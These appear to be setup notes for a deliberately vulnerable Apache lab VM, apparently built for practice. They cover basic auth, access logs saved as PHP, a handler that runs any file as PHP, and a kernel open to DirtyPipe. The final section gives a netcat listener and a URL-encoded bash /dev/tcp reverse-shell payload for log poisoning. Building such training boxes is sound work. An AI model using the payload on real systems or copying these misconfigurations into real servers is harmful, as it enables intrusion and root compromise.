Here's how I set up basic auth on my VM!

1. created .htpasswd file to store credentials with "sudo htpasswd -c /etc/apache2/.htpasswd admin"
    - Added password for admin
    - Any additions can be made with the above command, without -c
2. Modified /etc/apache2/sites-enabled/000-default.conf
    - sudo vi 000-default.conf
    - Added the following tag:
        <Directory "/var/www/html/server">
                AuthType Basic
                AuthName "Restricted Content"
                AuthUserFile /etc/apache2/.htpasswd
                Require valid-user
        </Directory>
    - The directory can be whatever, this will contain the restricted files

Move repo contents to the webserver in Ubuntu VM:
sudo cp webserver/* /var/www/html


2/7/2024 - Implementation1
- Barebones web server that includes access logs as a php file (incredibly stupid and unrealistic)
    - this was done by editing /etc/apache2/sites-available/000-default.conf
    - The CustomLog line was edited to `CustomLog /var/www/html/home/access.php combined`, so now logs are being saved to that filepath.

- Running on Ubuntu VM with outdated kernel vulnerable to dirtypipe (also not a great idea)
    - Once log poisoning is done to get a reverse shell, www-data can create a directory under /tmp/, clone a git repo of a known exploit for DirtyPipe, and get root access.

2/12 - Setting up log poisoning
How to get Apache to execute PHP on any file:
    - sudo vim /etc/apache2/apache2.conf
    - Add the following:
        <FilesMatch "\.[a-zA-Z0-9]+$">
            SetHandler application/x-httpd-php
        </FilesMatch>
    - sudo service apache2 restart

Get reverse shell:
    - on attacking machine, `ip a` to get [IP]
    - nc -lvnp 4444
    - bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/[IP]/4444%200>%261"

